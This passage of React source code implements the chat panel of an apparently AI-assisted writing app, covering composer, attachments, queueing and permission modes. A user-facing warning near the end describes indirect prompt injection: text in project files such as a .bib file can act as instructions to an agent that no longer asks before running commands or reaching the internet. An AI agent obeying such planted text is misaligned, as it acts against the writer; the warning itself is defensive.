import { Button } from "../ui/Button";
import { Kbd, Pressable, TextArea } from "../ui/controls";
import {
  lazy,
  memo,
  Suspense,
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { useDismiss } from "../useDismiss";
import { verbFor, type CallState } from "./tool-verb";
import { createTwoFilesPatch } from "diff";
import Patch from "./Patch";
import Prose from "./prose";
// Fetched when somebody asks for it: most sessions never open a past
// conversation, and the list and its renderers should not ship ahead of that.
const PastConversation = lazy(() => import("./PastConversation"));
const ContextPanel = lazy(() => import("./ContextPanel"));
// The menus under the composer's chip and for a `/` prompt. They were
// fetched on first use to keep them out of the entry chunk, which cost
// 870 ms of nothing on screen at the first press (Q-062); this column is
// its own chunk now, fetched when a project opens, so they come with it.
import { ComposerMenu, PromptMenu } from "./ComposerMenus";
import {
  alreadyNamed,
  completed,
  matching,
  slashHead,
  type PromptEntry,
} from "./slash-prompts";
import { shortRule } from "./short-rule";
import { welcome, WELCOME_ACTIONS } from "../welcome";
import { agentName } from "../agent-name";
import { foldTools, foldedSentence, type ShownItem, type ToolGroup } from "./tool-fold";
import {
  ChevronDownIcon, ChevronRightIcon, ClipIcon, ContextIcon, HistoryIcon, PlusIcon, SendIcon, SlidersIcon,
} from "../ui/icons";
import { Chip } from "../ui/controls";
import { IconButton } from "../ui/Button";
import { ColumnHeader } from "./column-header";
import { MODE_TITLES } from "./mode-words";
import api from "../api";
import {
  clearChat,
  firstChangedLine,
  get,
  markLive,
  markReverted,
  pushChat,
  resolvePermission,
  set,
  useStore,
  nextId,
  type ChatItem,
  type State,
} from "../store";

export type ChatHandle = {
  seed(text: string): void;
  /** Show what the agent reads, inside the column, aiming the file picker
   *  at a kind when one is named: the welcome's actions land here. */
  showReads(kind?: "style" | "voice"): void;
  /** Put the caret in the box.  The keyboard shortcut that opens the panel
   *  is only worth having if it leaves you ready to type. */
  focusComposer(): void;
};

/** Two kinds of noise the raw stream produces, removed before rendering:
 *  an `Edited main.tex` row immediately followed by the chip that says the
 *  same thing with a diff, and the same read repeated back to back. */
/** What a resolved card is called. Shared, because the decision is drawn
 *  both on its own row and on the tool row an answered card folds into,
 *  and those two must not drift into different words for one answer. */
export function decisionWords(decision: string | undefined): string {
  return decision === "expired"
    ? "Not answered"
    : decision === "deny"
      ? "Denied"
      : decision === "auto"
        ? "Allowed automatically"
        : decision === "conversation"
          ? "Allowed for this conversation"
          : decision === "always"
            ? "Allowed from now on"
            : "Allowed";
}

export function tidy(items: ChatItem[]): ChatItem[] {
  const out: ChatItem[] = [];
  for (const item of items) {
    if (item.kind === "tool" && HIDDEN_TOOLS.has(item.name)) continue;
    const previous = out[out.length - 1];
    if (
      item.kind === "edit" &&
      previous?.kind === "tool" &&
      ["Edit", "MultiEdit", "Write"].includes(previous.name) &&
      previous.summary.endsWith(item.path)
    ) {
      out.pop();
    } else if (
      // Records collapse; questions never do. A turn at one of the quiet
      // positions writes a row for every action it took, and at the
      // quietest one that record is the only account of what was done, so
      // a run of forty identical `Allowed automatically` lines is both the
      // audit trail working and unreadable. Same tool, same decision, same
      // literal thing, consecutively, and it is one row with a count.
      //
      // An *undecided* card is a question, and two questions are not one
      // question whatever they have in common, so nothing collapses until
      // it has been answered.
      item.kind === "permission" &&
      previous?.kind === "permission" &&
      item.decision &&
      previous.decision === item.decision &&
      previous.tool === item.tool &&
      previous.detail === item.detail
    ) {
      out[out.length - 1] = {
        ...previous,
        repeats: (previous.repeats ?? 1) + 1,
      };
      continue;
    } else if (
      // A card and the call it is about are one event, and were drawn as
      // two rows saying the same command, one above the other. Worse than
      // the repetition: the tool row is written when the call arrives
      // rather than when it is permitted, and every verb is past tense, so
      // `Ran echo hello` sat above a card headed "Run a shell command"
      // and stayed there if the writer said no.
      //
      // Merged by the id the card now carries, not by adjacency, because
      // the pairing has to survive a reload rebuilding the panel from the
      // record.
      item.kind === "permission" &&
      item.toolId &&
      previous?.kind === "tool" &&
      previous.id === item.toolId
    ) {
      // The card is attached either way, because the row above needs it to
      // know which tense it may use. Only an *answered* card is folded
      // away: an open one is a question with four buttons on it, and a
      // question the writer cannot answer is worse than a repeated line.
      out[out.length - 1] = { ...previous, card: item };
      if (item.decision) continue;
    } else if (
      item.kind === "tool" &&
      previous?.kind === "tool" &&
      previous.name === item.name &&
      previous.summary === item.summary
    ) {
      out[out.length - 1] = {
        ...previous,
        repeats: (previous.repeats ?? 1) + 1,
        // Summed, not the first one's.  Fourteen reads collapsed into one
        // row should say what the fourteen cost, which is the number worth
        // knowing about a turn that spent a while looking things up.
        ms:
          previous.ms == null && item.ms == null
            ? undefined
            : (previous.ms ?? 0) + (item.ms ?? 0),
        ok: previous.ok !== false && item.ok !== false,
      };
      continue;
    }
    out.push(item);
  }
  return out;
}

export default function Chat({
  onShowEdit,
  onHoverEdit,
  onFold,
  onAddContext,
  onChangeAgent,
  handleRef,
}: {
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
  onFold?: () => void;
  /** The header's name opens the sheet that chooses the writing agent. */
  onChangeAgent?: () => void;
  onAddContext?: (kind: "style" | "voice" | "template") => void;
  handleRef: (handle: ChatHandle) => void;
}) {
  const chat = useStore((s) => s.chat);
  // Collapsing repeated tool rows walks the whole transcript.  Streaming a
  // long answer re-renders this panel twenty times a second, and without
  // this it did that walk every time.
  const shown = useMemo(() => foldTools(tidy(chat)), [chat]);

  const thinking = useStore((s) => s.thinking);
  const selected = useStore((s) => s.selected);
  const blocked = useStore((s) => s.awaitingPermission);
  // What the agent is doing at this moment, read from the events rather
  // than guessed at.  This used to walk the whole transcript backwards on
  // every render, which is twenty walks a second while an answer streams,
  // and it could not tell a finished call from a running one because
  // nothing said a call had finished: a turn that spent twenty seconds in
  // one tool showed the same line throughout and read as a turn that had
  // stopped.
  const current = useStore((s) => s.activity);
  const activity = blocked
    ? "Waiting"
    : !thinking
      ? ""
      : current
        ? current.kind === "tool"
          ? `${verbFor(current.name)}${current.label ? ` ${shorten(current.label)}` : ""}`
          : current.label
        : "Thinking";
  const agent = useStore((s) => s.agent);
  const provider = agent?.provider;
  const name = agentName(provider);
  const [draft, setDraft] = useState("");
  const stream = useRef<HTMLDivElement | null>(null);
  const composer = useRef<HTMLTextAreaElement | null>(null);
  const pinned = useRef(true);
  // The question *and* what was selected when it was asked: a queued
  // follow-up goes out after the current turn ends, by which time the
  // writer has usually selected something else or nothing at all.
  const queued = useRef<
    { text: string; selection: State["selected"]; attached: string[] }[]
  >([]);
  // A ref does not re-render, so the "yours will go next" line read a count
  // that only changed when something else happened to redraw the panel.
  const [queuedCount, setQueuedCount] = useState(0);
  const projectId = useStore((s) => s.projectId);
  const [usage, setUsage] = useState<Awaited<ReturnType<typeof api.usage>> | null>(null);
  /** The chip's word for the model in use. */
  const modelName =
    usage?.models?.find((entry) => entry.id === usage?.model)?.name ?? "Default";
  /** The one menu under the chip: the model, and what the agent asks
   *  about. */
  const [menuOpen, setMenuOpen] = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);
  /** Which of the column's three views is up: the conversation, the
   *  filed-away ones, or what the agent reads. */
  const [view, setView] = useState<"live" | "past" | "reads">("live");
  const [readsFor, setReadsFor] = useState<"style" | "voice" | null>(null);
  const readsButton = useRef<HTMLButtonElement | null>(null);
  const menuRef = useRef<HTMLDivElement | null>(null);
  /** The chip, which the menu and the "all" confirmation give focus back to. */
  const modeButton = useRef<HTMLButtonElement | null>(null);
  // The two blocks that open *above* the composer.  They come before the
  // box in the DOM and their buttons come after it, so Tab from a trigger
  // walks away from the thing it just opened -- focus has to be moved by
  // hand, and given back when it closes.
  const confirmRef = useRef<HTMLDivElement | null>(null);
  const clearButton = useRef<HTMLButtonElement | null>(null);
  const keepButton = useRef<HTMLButtonElement | null>(null);
  // Every focus inside this panel is `preventScroll`, for the reason given
  // over `handleRef` below: the panel can be outside the shell when one of
  // these runs, and a focus that scrolls takes the whole window with it.
  const closeConfirm = useCallback(() => {
    setConfirmClear(false);
    clearButton.current?.focus({ preventScroll: true });
  }, []);
  useDismiss(confirmRef, confirmClear, closeConfirm, clearButton);
  useDismiss(
    menuRef,
    menuOpen,
    useCallback(() => setMenuOpen(false), []),
    modeButton,
  );
  const mode = useStore((s) => s.mode);
  // Only the Claude agent ever puts a card up, so only it is offered the
  // control: one on the others would promise a change that does not
  // happen.
  const [asks, setAsks] = useState(false);
  /** Images waiting to go with the next question. Local state rather than
   *  the store, because nothing outside this panel needs them and they are
   *  gone the moment Send is pressed. `url` is an object URL for the
   *  thumbnail, revoked when the chip goes. */
  const [attached, setAttached] = useState<
    { path: string; name: string; url: string }[]
  >([]);
  const [attaching, setAttaching] = useState(0);
  /** When the running turn started, or null. Set from `thinking` rather
   *  than from an event, because `turn_start` is not the only way a browser
   *  learns a turn is running: one that reconnects mid-turn finds out from
   *  `reconcile`, and a turn whose age started at that moment is a better
   *  answer than no age at all. */
  const [turnSince, setTurnSince] = useState<number | null>(null);
  const picker = useRef<HTMLInputElement | null>(null);
  // The position that asks about nothing is reached through a sentence, not
  // through a click. Held here rather than inside the popover because the
  // confirmation opens above the composer, in the same idiom as the
  // new-conversation question, and the popover closes on the way.
  const [confirmAll, setConfirmAll] = useState(false);
  const confirmAllRef = useRef<HTMLDivElement | null>(null);
  const keepAskingButton = useRef<HTMLButtonElement | null>(null);
  const closeConfirmAll = useCallback(() => {
    setConfirmAll(false);
    modeButton.current?.focus({ preventScroll: true });
  }, []);
  const chooseMode = async (chosen: "ask" | "project" | "all") => {
    if (!projectId) return;
    setMenuOpen(false);
    if (chosen === "all" && mode !== "all") {
      setConfirmAll(true);
      // Into the block and onto the safe half of it. The block opens
      // *above* the composer and its buttons come after the box in the
      // DOM, so Tab from the trigger walks away from the thing it just
      // opened; focus has to be moved by hand, and it goes to the answer
      // that keeps the fence up.
      window.setTimeout(
        () => keepAskingButton.current?.focus({ preventScroll: true }),
        0,
      );
      return;
    }
    setConfirmAll(false);
    try {
      await api.setMode(projectId, chosen);
      set({ mode: chosen });
    } catch (error: any) {
      set({ error: error.message });
    }
  };
  useDismiss(confirmAllRef, confirmAll, closeConfirmAll, modeButton);
  /** Switch the model this project's agent answers on. */
  const chooseModel = async (chosen: string) => {
    if (!projectId) return;
    setMenuOpen(false);
    try {
      const answer = await api.setModel(projectId, chosen);
      setUsage(await api.usage(projectId));
      // The client carries the model it was started with, so a change made
      // mid-answer is held back rather than applied -- applying it used to
      // close the transport the running turn was reading from, and that
      // turn then ended without ever saying so.  A control that appears to
      // do nothing is worse than one that explains itself.
      if (answer.deferred) {
        pushChat({
          kind: "notice",
          id: `model-${Date.now()}`,
          text: "The model changes for your next question: this answer finishes on the one it started with.",
          tone: "plain",
        });
      }
    } catch (error: any) {
      set({ error: error.message });
    }
  };

  const [focusedComposer, setFocusedComposer] = useState(false);

  // A `/` at the start of the draft names a reusable prompt. The list is
  // fetched each time a draft turns into one, not on mount, because most
  // messages are not commands and because a prompt copied into the
  // project a moment ago should show as the project's. The menu is drawn
  // while the box has focus and the draft could still mean something;
  // Escape puts it away until the draft changes. A draft that is exactly
  // a prompt's name, as it is after Enter picked one, gets no menu, so the
  // next Enter sends it as typed and the server expands it.
  const slash = slashHead(draft) !== null;
  const [prompts, setPrompts] = useState<PromptEntry[]>([]);
  const [promptRow, setPromptRow] = useState(0);
  const [promptsAway, setPromptsAway] = useState(false);
  useEffect(() => {
    if (!slash || !projectId) return;
    let live = true;
    api
      .prompts(projectId)
      .then((answer) => {
        if (live) setPrompts(answer.prompts);
      })
      .catch(() => undefined);
    return () => {
      live = false;
    };
  }, [slash, projectId]);
  const offered = useMemo(
    () => (slash ? matching(draft, prompts) : []),
    [slash, draft, prompts],
  );
  const promptMenuOpen =
    focusedComposer &&
    !promptsAway &&
    offered.length > 0 &&
    !alreadyNamed(draft, offered);
  const promptChosen = Math.min(promptRow, Math.max(offered.length - 1, 0));
  const pickPrompt = (index: number) => {
    const prompt = offered[index];
    if (!prompt) return;
    setDraft(completed(prompt));
    setPromptRow(0);
    composer.current?.focus({ preventScroll: true });
  };

  // The tally follows the end of a turn, which is when it changes.
  useEffect(() => {
    if (!projectId || thinking) return;
    api
      .usage(projectId)
      .then((answer) => {
        setUsage(answer);
        // A reload has no other way to learn either of these.
        setAsks(!!answer.asks);
        set({ mode: answer.mode ?? (answer.auto ? "project" : "ask") });
      })
      .catch(() => undefined);
  }, [projectId, thinking]);

  // `preventScroll` on both, and this one is not a nicety.  Opening the
  // panel puts the caret in the composer 60ms later, and when the panel is
  // an overlay it is still sliding in from beyond the right edge at that
  // point -- so the box being focused is outside the shell.  A bare
  // `focus()` has the browser scroll it into view, the shell is a scroll
  // container even though its overflow is hidden, and the whole layout ends
  // up dragged left by the width of the panel: the file rail off the
  // screen, the editor's gutter clipped at x=0, and a band of bare ground
  // down the right where the panes no longer reach.
  useEffect(() => {
    handleRef({
      showReads: (kind?: "style" | "voice") => {
        setConfirmClear(false);
        setView("reads");
        if (kind) setReadsFor(kind);
      },
      seed: (text: string) => {
        setDraft(text);
        composer.current?.focus({ preventScroll: true });
      },
      focusComposer: () => composer.current?.focus({ preventScroll: true }),
    });
  }, [handleRef]);

  // Follow the stream only while the reader is already at the bottom.
  useEffect(() => {
    const element = stream.current;
    if (element && pinned.current) element.scrollTop = element.scrollHeight;
  }, [chat]);

  // And stay there when what is on screen grows for any other reason.
  // Opening a folded run of tool calls while a permission card waited
  // made the content above the card taller without changing the
  // conversation, so the effect above did not run and the card's last row,
  // Always and Deny, went behind the composer (Q-063).
  useEffect(() => {
    const element = stream.current;
    if (!element || typeof ResizeObserver === "undefined") return;
    const follow = new ResizeObserver(() => {
      if (pinned.current) element.scrollTop = element.scrollHeight;
    });
    for (const child of Array.from(element.children)) follow.observe(child);
    return () => follow.disconnect();
  }, [chat, view]);

  /** Take images somebody pasted, dropped or picked.
   *
   *  Only images, and quietly: a paste is usually text, and a drop on the
   *  panel is usually an accident, so anything else is left alone rather
   *  than refused with a message about a thing the writer was not trying to
   *  do. A file the agent cannot look at is refused by the route, which is
   *  where the list of what it can look at lives.
   */
  const take = useCallback(
    async (files: File[]) => {
      const projectId = get().projectId;
      if (!projectId) return;
      const images = files.filter((file) => file.type.startsWith("image/"));
      if (!images.length) return;
      setAttaching((count) => count + images.length);
      for (const file of images) {
        try {
          const kept = await api.attach(projectId, file);
          setAttached((held) =>
            held.some((one) => one.path === kept.path)
              ? held
              : [...held, {
                  path: kept.path,
                  name: file.name || kept.name,
                  url: URL.createObjectURL(file),
                }],
          );
        } catch (error: any) {
          set({ error: error.message });
        } finally {
          setAttaching((count) => Math.max(0, count - 1));
        }
      }
    },
    [],
  );

  const drop = useCallback((path: string) => {
    setAttached((held) => {
      const going = held.find((one) => one.path === path);
      if (going) URL.revokeObjectURL(going.url);
      return held.filter((one) => one.path !== path);
    });
  }, []);

  const send = async () => {
    const text = draft.trim();
    const projectId = get().projectId;
    if (!text || !projectId) return;
    // Taken now rather than when the turn actually starts: a queued
    // question goes later, and by then the writer has usually clicked
    // somewhere else and the selection they meant is gone.
    const held = get().selected;
    const images = attached.map((one) => one.path);
    setDraft("");
    for (const one of attached) URL.revokeObjectURL(one.url);
    setAttached([]);
    // Marked pending, so `turn_start` recognises it as this tab's own and
    // does not add a second. Every other tab has none and pushes one.
    pushChat({ kind: "user", id: nextId(), text, at: Date.now(), pending: true });
    pinned.current = true;
    // Read from the store, not from this render's closure.  Pressing Enter
    // in the gap between the server's `done` and React re-rendering queued
    // the message -- into a ref, so nothing re-rendered, so the effect that
    // drains the queue never fired again and it sat there for good, looking
    // sent.
    if (get().thinking) {
      // A follow-up thought arrives while Claude is still answering the
      // last one.  Hold it and send it when the turn ends, rather than
      // refusing it and making the writer remember to ask again.
      queued.current.push({ text, selection: held, attached: images });
      setQueuedCount(queued.current.length);
      return;
    }
    try {
      await api.ask(projectId, text, held, images);
    } catch (error: any) {
      // Put it back in the box rather than losing what they typed.
      setDraft(text);
      set({ error: error.message });
    }
  };

  useEffect(() => {
    setTurnSince(thinking ? Date.now() : null);
  }, [thinking]);

  // Whatever was said while Claude was talking goes now.
  useEffect(() => {
    if (thinking || !projectId || !queued.current.length) return;
    const next = queued.current.shift();
    setQueuedCount(queued.current.length);
    if (next) {
      api.ask(projectId, next.text, next.selection, next.attached).catch((error: any) => {
        set({ error: error.message });
      });
    }
  }, [thinking, projectId]);

  return (
    <div className="flex h-full min-h-0 flex-col bg-surface-2" data-testid="chat">
      {view === "live" ? (
        <ColumnHeader
          title={name}
          testid="chat-header"
          onTitle={onChangeAgent}
          titleLabel={`Writing with ${name}. Change it.`}
          onFold={onFold}
          onClick={(event) => {
            // The whole row folds the column, as a pane header does, but a
            // press on one of its controls is that control's.
            if (!onFold) return;
            if ((event.target as HTMLElement).closest("button, select, input")) return;
            onFold();
          }}
        >
          {thinking || blocked ? (
            <span className="nx-column-work" data-testid="working" aria-live="polite">
              <span className={`nx-working ${blocked ? "bg-warn" : "bg-pen"}`} />
              <span className="truncate" title={activity}>{activity}</span>
              <Elapsed since={blocked ? null : current?.since ?? null} />
              {/* The turn's own age, as distinct from the age of whatever
                  it is doing this second, parenthesised so the pair reads
                  as one thing rather than two competing counters. */}
              {turnSince && !blocked ? <Elapsed since={turnSince} parenthesised /> : null}
            </span>
          ) : null}
          {/* The state, always on screen, as distinct from the control,
              which is under the composer. A lowered fence that survives a
              restart has to be visible without opening anything, and it
              says which of the two quiet positions it is in. One click
              steps back one position. */}
          {mode !== "ask" ? (
            <Pressable
              className="nx-column-auto"
              data-testid="auto-chip"
              title={
                mode === "all"
                  ? "Nothing is being asked about, not even a write outside this project. Click to go back to asking about those."
                  : "The work runs without asking. A write outside the project and anything reaching the internet are still asked about. Click to start asking about everything."
              }
              onClick={() => chooseMode(mode === "all" ? "project" : "ask")}
            >
              {mode === "all" ? "Auto, all" : "Auto"}
            </Pressable>
          ) : null}
          {/* Only when the activity line is not there: two flex-1 siblings
              split the slack, and the one line saying what the agent is
              doing clipped at half the room it had. */}
          {thinking || blocked ? null : <span className="min-w-0 flex-1" />}
          {thinking ? (
            <Button
              variant="quiet"
              data-testid="stop"
              // The key is on the button rather than only in a shortcut
              // table, because Stop is the one control somebody reaches
              // for in a hurry and a shortcut nobody knows about is not one.
              title="Stop this turn (Escape)"
              onClick={() => {
                const projectId = get().projectId;
                if (projectId) api.interrupt(projectId).catch(() => undefined);
              }}
            >
              Stop
            </Button>
          ) : null}
          {/* New conversation sits in the composer's tools row, where the
              writing happens (item 1.5); what it files away is here. */}
          <IconButton
            label="Past conversations"
            title="Read a conversation that was filed away"
            data-testid="past-open"
            onClick={() => {
              setConfirmClear(false);
              setView("past");
            }}
          >
            <HistoryIcon />
          </IconButton>
          <IconButton
            ref={readsButton}
            label={`What ${name} reads`}
            title="The memory, the template, the writing voice and the reusable prompts"
            data-testid="context-open"
            onClick={() => {
              setConfirmClear(false);
              setView("reads");
            }}
          >
            <ContextIcon />
          </IconButton>
        </ColumnHeader>
      ) : null}

      {view === "past" ? (
        <Suspense fallback={null}>
          <PastConversation
            onBack={() => setView("live")}
            onFold={onFold}
            usage={usage}
            provider={provider}
          />
        </Suspense>
      ) : null}
      {view === "reads" ? (
        <>
          <ColumnHeader
            title={`What ${name} reads`}
            onBack={() => {
              setView("live");
              window.setTimeout(() => readsButton.current?.focus({ preventScroll: true }), 0);
            }}
            backTestid="reads-back"
            onFold={onFold}
          />
          <Suspense fallback={null}>
            <ContextPanel openFor={readsFor} onHandled={() => setReadsFor(null)} />
          </Suspense>
        </>
      ) : null}
      {view === "live" ? (
      <>

      <div
        ref={stream}
        data-testid="chat-stream"
        className="min-h-0 flex-1 overflow-auto px-2.5 py-3"
        onScroll={(event) => {
          const element = event.currentTarget;
          pinned.current =
            element.scrollHeight - element.scrollTop - element.clientHeight < 40;
        }}
      >
        {chat.length === 0 ? (
          <div className="nx-arrive flex">
            <div className="nx-turn min-w-0 flex-1">
              <span className="sr-only">{name}</span>
              <div className="t-prose text-ink">
                <Prose text={welcome(name, provider !== "openai")} />
              </div>
              {/* The three things that most improve the help, as cards on
                  the first surface: each names what it adds and why. */}
              <div className="mt-1 flex flex-col gap-1.5">
                {WELCOME_ACTIONS.map((action) => (
                  <Pressable
                    key={action.kind}
                    className="nx-welcome-card"
                    onClick={() => onAddContext?.(action.kind)}
                  >
                    <b>{action.label}</b>
                    <span>{action.detail}</span>
                  </Pressable>
                ))}
              </div>
            </div>
          </div>
        ) : null}
        <div className="flex flex-col gap-5">
          {shown.map((item) => (
            <Item
              key={item.id}
              item={item}
              onShowEdit={onShowEdit}
              onHoverEdit={onHoverEdit}
            />
          ))}
        </div>
      </div>

      <div className="shrink-0 px-3 pb-2.5 pt-2">
        {/* Turning the fence off entirely is answered in place above the
            composer, in the same idiom as the new-conversation question and
            for the same reason: the sentence needs room, and this app has
            no modals. Three sentences, because the risk has three parts and
            summarising it into one would be the kind of warning people
            learn to dismiss. Said once, on the way in, and never again.

            The safe button takes focus, and it is the one that keeps the
            two remaining cards. */}
        {confirmAll ? (
          <div
            ref={confirmAllRef}
            id="nx-all-confirm"
            role="group"
            aria-label="Stop asking about anything"
            className="nx-confirm !mt-0 mb-2 !bg-surface"
          >
            <p className="t-meta text-ink">
              Nothing will ask. The agent will be able to write outside this
              project, run any command and reach the internet, with no card.
            </p>
            <p className="t-meta mt-2 text-ink-2">
              Some of its instructions come from this project&rsquo;s own
              files, and those arrive from templates, clones and co-authors.
              A sentence in somebody else&rsquo;s .bib file is an
              instruction it may follow.
            </p>
            <p className="t-meta mt-2 text-ink-2">
              Everything is still recorded in this conversation, so you can
              read afterwards what was done.
            </p>
            <div className="mt-2 flex flex-wrap gap-1.5">
              <Button
                ref={keepAskingButton}
                variant="ghost"
                data-testid="all-keep"
                onClick={closeConfirmAll}
              >
                Keep asking about those two
              </Button>
              <Button
                className="!text-warn"
                data-testid="all-confirm"
                onClick={async () => {
                  if (!projectId) return;
                  setConfirmAll(false);
                  try {
                    await api.setMode(projectId, "all");
                    set({ mode: "all" });
                  } catch (error: any) {
                    set({ error: error.message });
                  }
                  modeButton.current?.focus({ preventScroll: true });
                }}
              >
                Stop asking
              </Button>
            </div>
          </div>
        ) : null}
        {confirmClear ? (
          <div
            ref={confirmRef}
            id="nx-clear-confirm"
            role="group"
            aria-label="Start a new conversation"
            className="nx-confirm !mt-0 mb-2 !bg-surface"
          >
            <p className="t-meta text-ink-2">
              Start a new conversation? The record of this one is kept on
              disk.
            </p>
            {/* The safe answer carries the weight, and it is the one that
                takes focus, because the default answer to "shall I throw
                this away" is no. */}
            <div className="mt-2 flex gap-1.5">
              <Button
                ref={keepButton}
                variant="ghost"
                autoFocus
                data-testid="clear-keep"
                onClick={closeConfirm}
              >
                Keep this one
              </Button>
              <Button
                data-testid="clear-confirm"
                onClick={async () => {
                  if (!projectId) return;
                  try {
                    await api.resetChat(projectId);
                    clearChat();
                    queued.current = [];
                    setQueuedCount(0);
                    setConfirmClear(false);
                  } catch (error: any) {
                    set({ error: error.message });
                  }
                }}
              >
                Start new
              </Button>
            </div>
          </div>
        ) : null}
        {/* The composer is one card on the first surface, as the page
            draws it: what goes with the question as chips at the top, the
            box, and one row of tools under it. */}
        <div className="nx-composer">
          {attached.length || attaching || (selected && selected.text.trim()) ? (
            <div className="flex flex-wrap items-center gap-1.5" data-testid={attached.length || attaching ? "attachments" : undefined}>
              {/* What the question is about to carry. Shown because the
                  agent answering about a passage the writer no longer has
                  in mind is baffling if nothing on screen said it had been
                  attached, and because seeing it is how you learn that
                  selecting a paragraph first is worth doing. */}
              {selected && selected.text.trim() ? (
                <Chip data-testid="selection-chip">
                  {selected.fromLine === selected.toLine
                    ? `Line ${selected.fromLine}`
                    : `Lines ${selected.fromLine} to ${selected.toLine}`}{" "}
                  of <span className="font-mono text-caption">{selected.path.split("/").pop()}</span> go
                  {selected.fromLine === selected.toLine ? "es" : ""} with this
                </Chip>
              ) : null}
              {/* An image attached by accident to a question about
                  something else is worse than no attachment, and the only
                  way to notice is to see it. */}
              {attached.map((one) => (
                <Chip
                  key={one.path}
                  className="!pl-0.75"
                  onRemove={() => drop(one.path)}
                  removeLabel={`Take ${one.name} off this question`}
                  data-testid="attachment"
                >
                  <img src={one.url} alt="" className="h-4 w-4 rounded-xs object-cover" />
                  <span className="max-w-[14ch] truncate">{one.name}</span>
                </Chip>
              ))}
              {attaching ? (
                <span className="t-micro text-ink-3">
                  {attaching === 1 ? "Adding an image" : `Adding ${attaching} images`}
                </span>
              ) : null}
            </div>
          ) : null}
          <div className="relative">
            {promptMenuOpen ? (
              <Suspense fallback={null}>
                <PromptMenu
                  prompts={offered}
                  selected={promptChosen}
                  onPick={pickPrompt}
                  onHover={setPromptRow}
                />
              </Suspense>
            ) : null}
            <TextArea
              ref={composer}
              rows={2}
              value={draft}
              // Not disabled while a card is open, which is a deviation
              // from the specification and is recorded in section 28. The
              // writer's next question is very often about the thing the
              // card is asking about, and a box that will not take typing
              // has taken the conversation away at the one moment they
              // have something to say. The queue that makes this safe
              // already existed for a question asked mid-turn; a card
              // open means a turn is running, so the question goes next
              // rather than nowhere.
              //
              // The card's own keys stay bound to the card and not to the
              // window, which is what makes a live composer safe: typing
              // `a` into a textarea cannot answer a gate.
              // A screenshot arrives as a file on the clipboard on all
              // three platforms, so this is the whole of "paste an image":
              // no permission, no dialog. A paste that is text falls
              // through to the browser's own handling.
              onPaste={(event) => {
                const files = Array.from(event.clipboardData?.files ?? []);
                if (files.some((file) => file.type.startsWith("image/"))) {
                  event.preventDefault();
                  void take(files);
                }
              }}
              onDragOver={(event) => {
                if (Array.from(event.dataTransfer.types).includes("Files")) {
                  event.preventDefault();
                }
              }}
              onDrop={(event) => {
                const files = Array.from(event.dataTransfer.files ?? []);
                if (files.some((file) => file.type.startsWith("image/"))) {
                  event.preventDefault();
                  void take(files);
                }
              }}
              placeholder={blocked ? `Ask ${name}, or answer above` : `Ask ${name}, or type / for a prompt`}
              className="nx-composer-box"
              data-blocked={blocked || undefined}
              onFocus={() => setFocusedComposer(true)}
              onBlur={() => setFocusedComposer(false)}
              onChange={(event) => {
                setDraft(event.target.value);
                setPromptRow(0);
                setPromptsAway(false);
              }}
              onKeyDown={(event) => {
                // The prompt menu takes the keys a list takes while it is
                // up; Enter completes the name rather than sending, which
                // is the selection toolbar's rule: the writer sends on
                // their own.
                if (promptMenuOpen) {
                  if (event.key === "ArrowDown") {
                    event.preventDefault();
                    setPromptRow((promptChosen + 1) % offered.length);
                    return;
                  }
                  if (event.key === "ArrowUp") {
                    event.preventDefault();
                    setPromptRow(
                      (promptChosen - 1 + offered.length) % offered.length,
                    );
                    return;
                  }
                  if (event.key === "Enter" || event.key === "Tab") {
                    event.preventDefault();
                    pickPrompt(promptChosen);
                    return;
                  }
                  if (event.key === "Escape") {
                    event.preventDefault();
                    setPromptsAway(true);
                    return;
                  }
                }
                if (event.key === "Enter" && !event.shiftKey) {
                  event.preventDefault();
                  send();
                }
              }}
            />
          </div>
          {/* Three controls where there were six icons and a Send button:
              New conversation, since starting afresh belongs where the
              writing happens (the writer asked for it "to the left of the
              attach icon"); Attach; and one chip naming the model and what
              it asks about, which opens the one menu. The send glyph is
              the pen's, grey while the draft is empty; Enter sends. */}
          <div className="nx-composer-tools">
            <IconButton
              ref={clearButton}
              label="New conversation"
              on={confirmClear}
              aria-expanded={confirmClear}
              aria-controls={confirmClear ? "nx-clear-confirm" : undefined}
              title={thinking ? "Wait for this answer to finish" : "Start a new conversation"}
              data-testid="clear-chat"
              disabled={thinking}
              onClick={() => {
                setConfirmClear((asking) => {
                  // Into the block, and onto the safe half of it: this ends
                  // a conversation, so the default answer is no.
                  if (!asking) {
                    window.setTimeout(() => keepButton.current?.focus({ preventScroll: true }), 0);
                  }
                  return !asking;
                });
              }}
            >
              <PlusIcon />
            </IconButton>
            <input
              ref={picker}
              type="file"
              id="nx-attach"
              accept="image/png,image/jpeg,image/webp,image/gif"
              multiple
              hidden
              onChange={(event) => {
                void take(Array.from(event.target.files ?? []));
                event.target.value = "";
              }}
            />
            <IconButton
              label="Attach an image"
              title="Attach an image. You can also paste or drop one."
              data-testid="attach"
              onClick={() => picker.current?.click()}
            >
              <ClipIcon />
            </IconButton>
            <div className="relative min-w-0">
              <Pressable
                ref={modeButton}
                type="button"
                className="nx-mode-chip"
                data-warn={mode !== "ask" || undefined}
                data-on={menuOpen || undefined}
                aria-haspopup="menu"
                aria-expanded={menuOpen}
                aria-label={
                  asks
                    ? `Model and what to ask about: ${modelName}, ${MODE_TITLES[mode].toLowerCase()}`
                    : `Which model answers here: ${modelName}`
                }
                title="Which model answers, and what it asks about"
                data-testid="model-open"
                onClick={() => setMenuOpen((open) => !open)}
              >
                <SlidersIcon size={13} />
                <span className="truncate">
                  {modelName}
                  {asks ? `, ${mode === "ask" ? "asks first" : "without asking"}` : ""}
                </span>
              </Pressable>
              {menuOpen ? (
                <Suspense fallback={null}>
                  <ComposerMenu
                    ref={menuRef}
                    models={usage?.models ?? []}
                    current={usage?.model ?? ""}
                    onChooseModel={chooseModel}
                    asks={asks}
                    mode={mode}
                    onChooseMode={chooseMode}
                    onClose={() => setMenuOpen(false)}
                    onEscape={() => modeButton.current?.focus()}
                  />
                </Suspense>
              ) : null}
            </div>
            {/* The change announces itself once rather than being
                discovered. A card open used to print nothing here, because
                the box beside it was dead. */}
            <span className="nx-composer-hint">
              {blocked
                ? queuedCount
                  ? "Waiting on your answer, yours will go next"
                  : "Waiting on your answer"
                : thinking
                  ? queuedCount
                    ? `${name} is working, yours will go next`
                    : ""
                  : focusedComposer && draft.trim()
                    ? "Enter to send"
                    : ""}
            </span>
            <Pressable
              type="button"
